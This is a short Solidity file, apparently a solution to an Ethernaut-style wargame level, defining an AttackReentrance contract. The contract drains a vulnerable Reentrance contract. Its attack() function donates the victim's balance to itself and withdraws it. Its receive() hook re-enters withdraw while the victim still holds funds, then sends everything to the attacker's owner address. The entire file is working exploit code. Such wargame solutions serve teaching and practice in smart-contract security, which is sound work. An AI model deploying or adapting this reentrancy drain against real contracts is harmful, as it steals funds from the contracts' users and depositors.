// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../SafeMath.sol";
import "./Reentrance.sol";

contract AttackReentrance {
    address payable public victim;
    address payable public owner;

    constructor(address _victim) public payable {
        victim = payable(_victim);
        owner = msg.sender;
    }

    //the attack call was given a gas limit of 112799 and used 81962 (72.66%)
    function attack() public {
        uint256 balanceTotal = victim.balance;
        Reentrance(victim).donate{value: balanceTotal, gas: 1000000}( //need to add more gaz, otherwise donate() revert with out-of-gas error
            address(this)
        );
        Reentrance(victim).withdraw(balanceTotal);
    }

    receive() external payable {
        uint256 balanceTotal = victim.balance;
        if (balanceTotal > 0) {
            Reentrance(victim).withdraw(balanceTotal);
        }
        owner.transfer(address(this).balance);
    }
}
